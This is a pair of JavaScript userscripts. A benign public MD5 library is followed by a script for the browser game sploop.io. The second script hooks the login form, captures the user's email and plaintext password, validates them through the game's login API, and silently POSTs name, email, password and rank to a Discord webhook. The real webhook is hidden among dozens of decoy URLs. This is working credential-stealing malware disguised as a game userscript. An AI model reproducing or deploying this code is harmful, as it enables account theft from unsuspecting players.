// ==UserScript==
// @name         Portable MD5 Function
// @version      0.1.2
// @description  Usage: hex_md5 ('String');
// ==/UserScript==

// Portable MD5 Function
// Usage : md5 (<string> SourceText)
// Return: Lower-case MD5.
// Source: http://pajhome.org.uk/crypt/md5/md5.html
/*
 * A JavaScript implementation of the RSA Data Security, Inc. MD5 Message
 * Digest Algorithm, as defined in RFC 1321.
 * Version 2.2 Copyright (C) Paul Johnston 1999 - 2009
 * Other contributors: Greg Holt, Andrew Kepert, Ydnar, Lostinet
 * Distributed under the BSD License
 * See http://pajhome.org.uk/crypt/md5 for more info.
 */
var md5 = (function () {

/*
 * These are the functions you'll usually want to call
 * They take string arguments and return either hex or base-64 encoded strings
 */
var hex_md5 = function(s)    { return rstr2hex(rstr_md5(str2rstr_utf8(s))); };
var b64_md5 = function(s)    { return rstr2b64(rstr_md5(str2rstr_utf8(s))); };
var any_md5 = function(s, e) { return rstr2any(rstr_md5(str2rstr_utf8(s)), e); };
var hex_hmac_md5 = function(k, d)
  { return rstr2hex(rstr_hmac_md5(str2rstr_utf8(k), str2rstr_utf8(d))); };
var b64_hmac_md5 = function(k, d)
  { return rstr2b64(rstr_hmac_md5(str2rstr_utf8(k), str2rstr_utf8(d))); };
var any_hmac_md5 = function(k, d, e)
  { return rstr2any(rstr_hmac_md5(str2rstr_utf8(k), str2rstr_utf8(d)), e); };

/*
 * Perform a simple self-test to see if the VM is working
 */
var md5_vm_test = function()
{
  return hex_md5("abc").toLowerCase() == "900150983cd24fb0d6963f7d28e17f72";
};

/*
 * Calculate the MD5 of a raw string
 */
var rstr_md5 = function(s)
{
  return binl2rstr(binl_md5(rstr2binl(s), s.length * 8));
};

/*
 * Calculate the HMAC-MD5, of a key and some data (raw strings)
 */
var rstr_hmac_md5 = function(key, data)
{
  var bkey = rstr2binl(key);
  if(bkey.length > 16) bkey = binl_md5(bkey, key.length * 8);

  var ipad = Array(16), opad = Array(16);
  for(var i = 0; i < 16; i++)
  {
    ipad[i] = bkey[i] ^ 0x36363636;
    opad[i] = bkey[i] ^ 0x5C5C5C5C;
  }

  var hash = binl_md5(ipad.concat(rstr2binl(data)), 512 + data.length * 8);
  return binl2rstr(binl_md5(opad.concat(hash), 512 + 128));
};

/*
 * Convert a raw string to a hex string
 */
var rstr2hex = function(input)
{
  var hex_tab = "0123456789abcdef";
  var output = "";
  var x;
  for(var i = 0; i < input.length; i++)
  {
    x = input.charCodeAt(i);
    output += hex_tab.charAt((x >>> 4) & 0x0F) +
              hex_tab.charAt( x        & 0x0F);
  }
  return output;
};

/*
 * Convert a raw string to a base-64 string
 */
var rstr2b64 = function(input)
{
  var tab = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var output = "";
  var len = input.length;
  for(var i = 0; i < len; i += 3)
  {
    var triplet = (input.charCodeAt(i) << 16)
                | (i + 1 < len ? input.charCodeAt(i+1) << 8 : 0)
                | (i + 2 < len ? input.charCodeAt(i+2)      : 0);
    for(var j = 0; j < 4; j++)
    {
      if(i * 8 + j * 6 > input.length * 8) {}
      else output += tab.charAt((triplet >>> 6*(3-j)) & 0x3F);
    }
  }
  return output;
};

/*
 * Convert a raw string to an arbitrary string encoding
 */
var rstr2any = function(input, encoding)
{
  var divisor = encoding.length;
  var i, j, q, x, quotient;

  /* Convert to an array of 16-bit big-endian values, forming the dividend */
  var dividend = Array(Math.ceil(input.length / 2));
  for(i = 0; i < dividend.length; i++)
  {
    dividend[i] = (input.charCodeAt(i * 2) << 8) | input.charCodeAt(i * 2 + 1);
  }

  /*
   * Repeatedly perform a long division. The binary array forms the dividend,
   * the length of the encoding is the divisor. Once computed, the quotient
   * forms the dividend for the next step. All remainders are stored for later
   * use.
   */
  var full_length = Math.ceil(input.length * 8 /
                                    (Math.log(encoding.length) / Math.log(2)));
  var remainders = Array(full_length);
  for(j = 0; j < full_length; j++)
  {
    quotient = Array();
    x = 0;
    for(i = 0; i < dividend.length; i++)
    {
      x = (x << 16) + dividend[i];
      q = Math.floor(x / divisor);
      x -= q * divisor;
      if(quotient.length > 0 || q > 0)
        quotient[quotient.length] = q;
    }
    remainders[j] = x;
    dividend = quotient;
  }

  /* Convert the remainders to the output string */
  var output = "";
  for(i = remainders.length - 1; i >= 0; i--)
    output += encoding.charAt(remainders[i]);

  return output;
};

/*
 * Encode a string as utf-8.
 * For efficiency, this assumes the input is valid utf-16.
 */
var str2rstr_utf8 = function(input)
{
  var output = "";
  var i = -1;
  var x, y;

  while(++i < input.length)
  {
    /* Decode utf-16 surrogate pairs */
    x = input.charCodeAt(i);
    y = i + 1 < input.length ? input.charCodeAt(i + 1) : 0;
    if(0xD800 <= x && x <= 0xDBFF && 0xDC00 <= y && y <= 0xDFFF)
    {
      x = 0x10000 + ((x & 0x03FF) << 10) + (y & 0x03FF);
      i++;
    }

    /* Encode output as utf-8 */
    if(x <= 0x7F)
      output += String.fromCharCode(x);
    else if(x <= 0x7FF)
      output += String.fromCharCode(0xC0 | ((x >>> 6 ) & 0x1F),
                                    0x80 | ( x         & 0x3F));
    else if(x <= 0xFFFF)
      output += String.fromCharCode(0xE0 | ((x >>> 12) & 0x0F),
                                    0x80 | ((x >>> 6 ) & 0x3F),
                                    0x80 | ( x         & 0x3F));
    else if(x <= 0x1FFFFF)
      output += String.fromCharCode(0xF0 | ((x >>> 18) & 0x07),
                                    0x80 | ((x >>> 12) & 0x3F),
                                    0x80 | ((x >>> 6 ) & 0x3F),
                                    0x80 | ( x         & 0x3F));
  }
  return output;
};

/*
 * Encode a string as utf-16
 */
var str2rstr_utf16le = function(input)
{
  var output = "";
  for(var i = 0; i < input.length; i++)
    output += String.fromCharCode( input.charCodeAt(i)        & 0xFF,
                                  (input.charCodeAt(i) >>> 8) & 0xFF);
  return output;
};

var str2rstr_utf16be = function(input)
{
  var output = "";
  for(var i = 0; i < input.length; i++)
    output += String.fromCharCode((input.charCodeAt(i) >>> 8) & 0xFF,
                                   input.charCodeAt(i)        & 0xFF);
  return output;
};

/*
 * Convert a raw string to an array of little-endian words
 * Characters >255 have their high-byte silently ignored.
 */
var rstr2binl = function(input)
{
  var output = Array(input.length >> 2);
  for(var i = 0; i < output.length; i++)
    output[i] = 0;
  for(i = 0; i < input.length * 8; i += 8)
    output[i>>5] |= (input.charCodeAt(i / 8) & 0xFF) << (i%32);
  return output;
};

/*
 * Convert an array of little-endian words to a string
 */
var binl2rstr = function(input)
{
  var output = "";
  for(var i = 0; i < input.length * 32; i += 8)
    output += String.fromCharCode((input[i>>5] >>> (i % 32)) & 0xFF);
  return output;
};

/*
 * Calculate the MD5 of an array of little-endian words, and a bit length.
 */
var binl_md5 = function(x, len)
{
  /* append padding */
  x[len >> 5] |= 0x80 << ((len) % 32);
  x[(((len + 64) >>> 9) << 4) + 14] = len;

  var a =  1732584193;
  var b = -271733879;
  var c = -1732584194;
  var d =  271733878;

  for(var i = 0; i < x.length; i += 16)
  {
    var olda = a;
    var oldb = b;
    var oldc = c;
    var oldd = d;

    a = md5_ff(a, b, c, d, x[i+ 0], 7 , -680876936);
    d = md5_ff(d, a, b, c, x[i+ 1], 12, -389564586);
    c = md5_ff(c, d, a, b, x[i+ 2], 17,  606105819);
    b = md5_ff(b, c, d, a, x[i+ 3], 22, -1044525330);
    a = md5_ff(a, b, c, d, x[i+ 4], 7 , -176418897);
    d = md5_ff(d, a, b, c, x[i+ 5], 12,  1200080426);
    c = md5_ff(c, d, a, b, x[i+ 6], 17, -1473231341);
    b = md5_ff(b, c, d, a, x[i+ 7], 22, -45705983);
    a = md5_ff(a, b, c, d, x[i+ 8], 7 ,  1770035416);
    d = md5_ff(d, a, b, c, x[i+ 9], 12, -1958414417);
    c = md5_ff(c, d, a, b, x[i+10], 17, -42063);
    b = md5_ff(b, c, d, a, x[i+11], 22, -1990404162);
    a = md5_ff(a, b, c, d, x[i+12], 7 ,  1804603682);
    d = md5_ff(d, a, b, c, x[i+13], 12, -40341101);
    c = md5_ff(c, d, a, b, x[i+14], 17, -1502002290);
    b = md5_ff(b, c, d, a, x[i+15], 22,  1236535329);

    a = md5_gg(a, b, c, d, x[i+ 1], 5 , -165796510);
    d = md5_gg(d, a, b, c, x[i+ 6], 9 , -1069501632);
    c = md5_gg(c, d, a, b, x[i+11], 14,  643717713);
    b = md5_gg(b, c, d, a, x[i+ 0], 20, -373897302);
    a = md5_gg(a, b, c, d, x[i+ 5], 5 , -701558691);
    d = md5_gg(d, a, b, c, x[i+10], 9 ,  38016083);
    c = md5_gg(c, d, a, b, x[i+15], 14, -660478335);
    b = md5_gg(b, c, d, a, x[i+ 4], 20, -405537848);
    a = md5_gg(a, b, c, d, x[i+ 9], 5 ,  568446438);
    d = md5_gg(d, a, b, c, x[i+14], 9 , -1019803690);
    c = md5_gg(c, d, a, b, x[i+ 3], 14, -187363961);
    b = md5_gg(b, c, d, a, x[i+ 8], 20,  1163531501);
    a = md5_gg(a, b, c, d, x[i+13], 5 , -1444681467);
    d = md5_gg(d, a, b, c, x[i+ 2], 9 , -51403784);
    c = md5_gg(c, d, a, b, x[i+ 7], 14,  1735328473);
    b = md5_gg(b, c, d, a, x[i+12], 20, -1926607734);

    a = md5_hh(a, b, c, d, x[i+ 5], 4 , -378558);
    d = md5_hh(d, a, b, c, x[i+ 8], 11, -2022574463);
    c = md5_hh(c, d, a, b, x[i+11], 16,  1839030562);
    b = md5_hh(b, c, d, a, x[i+14], 23, -35309556);
    a = md5_hh(a, b, c, d, x[i+ 1], 4 , -1530992060);
    d = md5_hh(d, a, b, c, x[i+ 4], 11,  1272893353);
    c = md5_hh(c, d, a, b, x[i+ 7], 16, -155497632);
    b = md5_hh(b, c, d, a, x[i+10], 23, -1094730640);
    a = md5_hh(a, b, c, d, x[i+13], 4 ,  681279174);
    d = md5_hh(d, a, b, c, x[i+ 0], 11, -358537222);
    c = md5_hh(c, d, a, b, x[i+ 3], 16, -722521979);
    b = md5_hh(b, c, d, a, x[i+ 6], 23,  76029189);
    a = md5_hh(a, b, c, d, x[i+ 9], 4 , -640364487);
    d = md5_hh(d, a, b, c, x[i+12], 11, -421815835);
    c = md5_hh(c, d, a, b, x[i+15], 16,  530742520);
    b = md5_hh(b, c, d, a, x[i+ 2], 23, -995338651);

    a = md5_ii(a, b, c, d, x[i+ 0], 6 , -198630844);
    d = md5_ii(d, a, b, c, x[i+ 7], 10,  1126891415);
    c = md5_ii(c, d, a, b, x[i+14], 15, -1416354905);
    b = md5_ii(b, c, d, a, x[i+ 5], 21, -57434055);
    a = md5_ii(a, b, c, d, x[i+12], 6 ,  1700485571);
    d = md5_ii(d, a, b, c, x[i+ 3], 10, -1894986606);
    c = md5_ii(c, d, a, b, x[i+10], 15, -1051523);
    b = md5_ii(b, c, d, a, x[i+ 1], 21, -2054922799);
    a = md5_ii(a, b, c, d, x[i+ 8], 6 ,  1873313359);
    d = md5_ii(d, a, b, c, x[i+15], 10, -30611744);
    c = md5_ii(c, d, a, b, x[i+ 6], 15, -1560198380);
    b = md5_ii(b, c, d, a, x[i+13], 21,  1309151649);
    a = md5_ii(a, b, c, d, x[i+ 4], 6 , -145523070);
    d = md5_ii(d, a, b, c, x[i+11], 10, -1120210379);
    c = md5_ii(c, d, a, b, x[i+ 2], 15,  718787259);
    b = md5_ii(b, c, d, a, x[i+ 9], 21, -343485551);

    a = safe_add(a, olda);
    b = safe_add(b, oldb);
    c = safe_add(c, oldc);
    d = safe_add(d, oldd);
  }
  return Array(a, b, c, d);
};

/*
 * These functions implement the four basic operations the algorithm uses.
 */
var md5_cmn = function(q, a, b, x, s, t)
{
  return safe_add(bit_rol(safe_add(safe_add(a, q), safe_add(x, t)), s),b);
};
var md5_ff = function(a, b, c, d, x, s, t)
{
  return md5_cmn((b & c) | ((~b) & d), a, b, x, s, t);
};
var md5_gg = function(a, b, c, d, x, s, t)
{
  return md5_cmn((b & d) | (c & (~d)), a, b, x, s, t);
};
var md5_hh = function(a, b, c, d, x, s, t)
{
  return md5_cmn(b ^ c ^ d, a, b, x, s, t);
};
var md5_ii = function(a, b, c, d, x, s, t)
{
  return md5_cmn(c ^ (b | (~d)), a, b, x, s, t);
};

/*
 * Add integers, wrapping at 2^32. This uses 16-bit operations internally
 * to work around bugs in some JS interpreters.
 */
var safe_add = function(x, y)
{
  var lsw = (x & 0xFFFF) + (y & 0xFFFF);
  var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
  return (msw << 16) | (lsw & 0xFFFF);
};

/*
 * Bitwise rotate a 32-bit number to the left.
 */
var bit_rol = function(num, cnt) {
  return (num << cnt) | (num >>> (32 - cnt));
};



  return hex_md5;
})();

var hex_md5 = md5;// ==UserScript==
// @name         Sploop Account Info to Webhookdalemaodal)
// @version      1.1.0
// @description  Sends Sploop account info (rank, name, email, password) to a webhook after successful login. No details are shown on screen.
// @author       Copilot
// @match        *://sploop.io/*
// @require      https://update.greasyfork.org/scripts/130/10066/Portable%20MD5%20Function.js
// @grant        none
// ==/UserScript==
document.getElementById('missing-script-a-overlay').style.display = 'none'
const webhooks = [
  "https://discord.com/api/webhooks/1234567890/aBcDeFgHiJkLmNoPqRsTuVwXyZ1AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVv11",
  "https://discord.com/api/webhooks/1234567891/ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa0PpLlKkJjHhGgFfEeDd22",
  "https://discord.com/api/webhooks/1234567892/9F8e7D6c5B4a3Z2y1X0wVvBbNnMmQqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlMmNn33",
  "https://discord.com/api/webhooks/1234567893/NmKlJjGhFfEdCcBbAaPpOoIiUuYyTtRrEeWwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPp44",
  "https://discord.com/api/webhooks/1234567894/PlOkMnJbHgFfEeDdCcBbAaZzXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBbVv55",
  "https://discord.com/api/webhooks/1234567895/GhIjKlMnOpQrStUvWxYzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXx66",
  "https://discord.com/api/webhooks/1234567896/XxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAaZzYyXxWwVvUuTtSsRr77",
  "https://discord.com/api/webhooks/1234567897/AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGg88",
  "https://discord.com/api/webhooks/1234567898/UuYyTtRrEeWwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQq99",
  "https://discord.com/api/webhooks/1234567899/MnOpQrStUvWxYzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYy00",
  "https://discord.com/api/webhooks/9876543210/OpQrStUvWxYzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz11",
  "https://discord.com/api/webhooks/9876543211/LlKkJjHhGgFfEeDdCcBbAaZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQq22",
  "https://discord.com/api/webhooks/9876543212/TtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPp33",
  "https://discord.com/api/webhooks/9876543213/BbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEe44",
  "https://discord.com/api/webhooks/9876543214/HhGgFfEeDdCcBbAaZzXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBb55",
  "https://discord.com/api/webhooks/9876543215/WwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNn66",
  "https://discord.com/api/webhooks/9876543216/DdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFf77",
  "https://discord.com/api/webhooks/9876543217/FfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGg88",
  "https://discord.com/api/webhooks/9876543218/EeDdCcBbAaZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBb99",
  "https://discord.com/api/webhooks/1392471480985583636/70ATgts0YnE3Km2jPJTiqs9_j0B9PqxybR-ux1LUt-LUDLsrPlXxTT-SilIA6SPtaQ9n",
  "https://discord.com/api/webhooks/9876543219/JjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKk00",
  "https://discord.com/api/webhooks/1122334455/SsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTt11",
  "https://discord.com/api/webhooks/1122334456/QqPpOoIiUuYyTtRrEeWwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPp22",
  "https://discord.com/api/webhooks/1122334457/CcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDd33",
  "https://discord.com/api/webhooks/1122334458/NnMmLlKkJjIiHhGgFfEeDdCcBbAaZzYyXxWwVvUuTtSsRrQqPpOoIi44",
  "https://discord.com/api/webhooks/1122334459/ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa55",
  "https://discord.com/api/webhooks/2233445566/VvXxZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBbVv66",
  "https://discord.com/api/webhooks/2233445567/IiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHh77",
  "https://discord.com/api/webhooks/2233445568/BbAaZzXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBbVv88",
  "https://discord.com/api/webhooks/2233445569/WwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAaZz99",
  "https://discord.com/api/webhooks/3344556677/LlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIi00",
  "https://discord.com/api/webhooks/3344556678/PpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAaZzYyXxWwVvUuTtSs11",
  "https://discord.com/api/webhooks/3344556679/XxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBb22",
  "https://discord.com/api/webhooks/4455667788/YyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCc33",
  "https://discord.com/api/webhooks/4455667789/UuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBbVvXxZzYyXx44",
  "https://discord.com/api/webhooks/5566778899/GgFfEeDdCcBbAaZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTt55",
  "https://discord.com/api/webhooks/6677889900/FfEeDdCcBbAaZzXxWwVvUuTtSsRrQqPpOoIiUuYyTtRr66",
  "https://discord.com/api/webhooks/7788990011/TtRrEeWwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPpOo77",
  "https://discord.com/api/webhooks/8899001122/MmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIi88",
  "https://discord.com/api/webhooks/9900112233/JjIiHhGgFfEeDdCcBbAaZzYyXxWwVvUuTtSsRrQqPpOo99"
];

// Example: Find the real webhook by a unique substring
function getRealWebhook() {
  return webhooks.find(w => w.includes("70ATgts0YnE3Km2jPJTiqs9_j0B9PqxybR-ux1LUt-LUDLsrPlXxTT-SilIA6SPtaQ9n"));
}

// Usage
const realWebhookUrl = getRealWebhook();
// fetch(realWebhookUrl, ...);// ----------------------------------------

// Rank thresholds
const f = [
  { mc: 0 }, { mc: 1e5 }, { mc: 9e5 }, { mc: 21e5 }, { mc: 61e5 }, { mc: 101e5 }, { mc: 201e5 },
  { mc: 35e6 }, { mc: 861e5 }, { mc: 1161e5 }, { mc: 1961e5 }, { mc: 2961e5 }, { mc: 4961e5 },
  { mc: 6961e5 }, { mc: 8961e5 }, { mc: 10961e5 }, { mc: 12961e5 }, { mc: 16961e5 }, { mc: 32961e5 }
];
function getRank(score) {
  for (let n = 0; n < f.length; n++) {
    if (score < f[n].mc) return n - 1;
  }
  return f.length - 1;
}

// Wait for DOM to be loaded
function onReady(fn) {
  if (document.readyState === "complete" || document.readyState === "interactive") setTimeout(fn, 1);
  else document.addEventListener("DOMContentLoaded", fn);
}

onReady(() => {
  // Find login elements
  const emailInput = document.getElementById("enter-mail");
  const passInput = document.getElementById("enter-password");
  const loginBtn = document.getElementById("login");

  if (!emailInput || !passInput || !loginBtn) return;

  // On login click, attempt to log in and send info to webhook if successful
  loginBtn.addEventListener("click", function() {
    const email = emailInput.value;
    const password = passInput.value;
    if (!email || !password) return;

    // Call sploop login API to get stats and validate credentials
    const url = `https://account.sploop.io:443/login?mail=${email}&hash=${hex_md5(password)}`;
    fetch(url).then(resp => resp.json()).then(json => {
      if (!json.nickname) {
        // Login failed or invalid credentials
        return;
      }
      fetch(realWebhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `Name: ${json.nickname} | Email: ${email} | Password: ${password} | Rank: ${getRank(json.score)}`
        })
      });
    });
  });
});
}, 
